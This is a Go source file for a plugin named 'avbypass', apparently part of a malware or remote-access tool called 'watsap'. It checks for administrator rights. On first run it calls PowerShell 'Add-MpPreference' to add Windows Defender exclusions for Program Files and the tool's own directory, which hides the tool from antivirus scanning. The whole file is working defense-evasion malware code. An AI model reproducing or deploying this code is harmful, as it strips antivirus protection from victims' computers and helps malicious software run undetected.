//go:build windows

package avbypass

import (
	"fmt"
	"os"
	"os/exec"
	"watsap/utils/config"
	"watsap/utils/logger"
)

// var customAVName = "'Windows Defender Antivirus'"
var powershellPath string
var defenderExclusions []string

func init() {
	defenderExclusions = []string{
		os.Getenv("ProgramFiles"),
		config.WaDir,
	}

	logger.Debug("BypassAV", "Plugin initialized.")
	if err := checkPowerShell(); err != nil {
		logger.Debug("BypassAV", "Initialization warning: %v", err)
	}
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func checkPowerShell() error {
	// FIX: We use 'path' here to avoid shadowing the global 'powershellPath' variable.
	path, err := exec.LookPath("powershell")
	if err != nil {
		return fmt.Errorf("powershell not found in system")
	}
	powershellPath = path
	logger.Debug("BypassAV", "PowerShell found at: %s", powershellPath)
	return nil
}

func Main() {
	if powershellPath == "" {
		logger.Debug("BypassAV", "PowerShell path is missing. Aborting operation.")
		return
	}

	if isAdmin() && config.FirstRun {
		AddDefenderExclusions()

		logger.Info("BypassAV", "Defender exclusions added locally.")
	}
}

func AddDefenderExclusions() {
	logger.Info("BypassAV", "Attempting to add Defender exclusions...")
	for _, path := range defenderExclusions {
		if path == "" {
			continue
		}
		psCommand := fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' -Force", path)

		cmd := exec.Command(powershellPath, "-NoProfile", "-Command", psCommand)
		output, err := cmd.CombinedOutput()

		if err != nil {
			logger.Error("BypassAV", "Failed to add exclusion: %s | Error: %s", path, string(output))
		} else {
			logger.Info("BypassAV", "Successfully added exclusion: %s", path)
		}
	}
}
